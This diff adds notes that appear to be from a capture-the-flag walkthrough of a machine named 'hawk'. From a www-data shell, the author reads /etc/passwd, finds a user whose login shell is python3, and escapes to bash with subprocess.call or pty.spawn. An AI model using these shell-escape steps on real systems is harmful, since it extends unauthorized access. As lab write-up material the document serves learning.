@@ -1,1 +1,13 @@
+User's shell set to python?:
 
+www-data@hawk:/var/www/html$ grep daniel /etc/passwd
+daniel:x:1002:1005::/home/daniel:/usr/bin/python3
+
+Still, it is easy enough to escape:
+
+>>> import subprocess
+>>> subprocess.call('/bin/bash', shell=True)
+daniel@hawk:/var/www/html$ id
+uid=1002(daniel) gid=1005(daniel) groups=1005(daniel)
+
+pty.spawn("/bin/bash") also works to escape the python shell.
